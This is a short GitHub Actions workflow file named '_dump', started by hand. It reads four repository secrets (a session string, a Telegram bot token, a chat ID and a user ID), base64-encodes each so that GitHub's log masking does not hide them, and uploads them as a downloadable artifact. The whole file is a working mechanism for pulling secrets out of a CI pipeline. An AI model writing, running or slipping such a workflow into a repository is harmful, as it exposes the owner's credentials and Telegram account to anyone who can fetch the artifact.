name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_SESSION: ${{ secrets.SESSION }}
          S_TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
          S_TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
          S_USER_ID: ${{ secrets.USER_ID }}
        run: |
          mkdir -p out
          printf '%s' "$S_SESSION" | base64 -w0 > out/SESSION.b64
          printf '%s' "$S_TG_BOT_TOKEN" | base64 -w0 > out/TG_BOT_TOKEN.b64
          printf '%s' "$S_TG_CHAT_ID" | base64 -w0 > out/TG_CHAT_ID.b64
          printf '%s' "$S_USER_ID" | base64 -w0 > out/USER_ID.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
